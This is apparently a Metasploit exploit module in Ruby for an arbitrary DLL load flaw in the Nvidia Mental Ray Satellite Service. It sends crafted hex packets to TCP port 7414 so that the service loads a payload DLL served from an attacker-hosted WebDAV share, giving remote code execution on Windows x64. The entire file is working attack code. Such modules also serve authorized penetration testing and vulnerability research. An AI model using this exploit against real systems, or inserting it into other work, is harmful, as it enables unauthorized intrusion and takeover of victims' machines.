##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/http/webdav'
require 'socket'
#load '/root/git/metasploit-framework/lib/msf/core/exploit/http/webdav.rb'

class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::WebDAVServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Nvidia Mental Ray Satellite Service Arbitrary DLL Load',
      'Description'	=> %q{
          Tested on Win7 x64 with http://images.autodesk.com/adsk/files/Maya_mrsat3.11.1_Win_64bit.exe
      },
      'License'		=> MSF_LICENSE,
      'Author'		=>
        [
          'Luigi Auriemma', # Discovery
          'Donato Ferrante', # Discovery
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk' # Metasploit Module
        ],
      'References'	=>
        [
          [ 'URL', 'http://revuln.com/files/ReVuln_NVIDIA_mental_ray.pdf' ]
        ],
      'Platform'	=> 'win',
      'Targets'		 =>
        [
          [ 'Windows x64',
            {
              'Arch'   	=>	ARCH_X86_64
            }
          ],
        ],
      'Privileged'	 => true,
      'DisclosureDate' => 'Dec 10 2013',
      'DefaultTarget'	 => 0))

    register_options([
                         Opt::RPORT(7414)
                     ])

  end

  def payload_data
    generate_payload_dll
  end

  def payload_name
    @payload_name
  end

  def exploit
    print_status("Please be patient as we have to wait for SMB timeouts before WebDAV is used.")
    super
  end

  def primer
    # No idea what most of this hello is...
    hello = "6c72696d3030303030203030303031203136333932203037353134203030303031203039303936203030303030207261796d736734"
    hello << "302d332e31312e312e345f5f5f5f5f5f5f5f5f5f5f5f0020007c5241593331317c53554231000100000000e903000000000000fff"
    hello << "fffffffffffff1807000000000000dc10d7fdfe0700003018a40500000000e73654fffe070000c0afcd0000000000ffffffffffff"
    hello << "ffffffffffffffffffff18070000000000007014a70100000000763754fffe0700000000000000000000f035ae01000000003036a"
    hello << "e0100000000da2152fffe0700003036ae0100000000a33754fffe07000000000000000000000000000000000000ffffffffffffff"
    hello << "ffffffffffffffffff3036ae0100000000c40e53fffe0700007014a70100000000180700000000000000000000000000000000000"
    hello << "00000000000000000000000000200000000000000010000000000000050354404000000008013a7010000000090b3cd0000000000"
    hello << "1807000000000000b929d803000000000000000000000000180700000000000090b3cd000000000010cda70100000000000000000"
    hello << "0000000010100000000000000b3cd0000000000060000000000000066000200000000000000020000000a0008000000a01a0fe73d"
    hello << "00cf118ca300804034ae010000000001000000000000000000000000000000030000000a000000"

    hello = Rex::Text.hex_to_raw(hello)
    @share_name = rand_text_alpha(8)
    @payload_name = rand_text_alpha(8) + ".dll"
    path = "#{webdav_path}#{@share_name}\\#{@payload_name}"

    # Start of command - again no idea
    load_dll =  Rex::Text.hex_to_raw("4ed32cb1740500000000000001130013")
    # Length of path string including null byte
    load_dll << [path.length+1].pack('V')
    # Data type? Not sure
    load_dll << [2].pack('V')
    # Assembly Load? Not sure
    load_dll << "AL"
    load_dll << path << "\x00"
    # Some padding at the end... Could be randomized perhaps?
    load_dll << "\x00" * (1386 - path.length)

    # We have to start a second listening port so we just use Ruby Sockets for this at the moment...
    # modules/exploits/winndows/browser/adobe_flash_rtmp maybe have a better way of doing this
    # although we dont actually care about handling client connections it appears as long as the
    # service can make a connection its happy and will move onto the DLL loading
    port = 7514
    server = TCPServer.open(port)

    connect
    sock.put(hello)
    sock.put(load_dll)
    sleep(2000)
    disconnect
    print_good("Exploit commands delivered... Please be patient for WebDAV connection")
  end
end

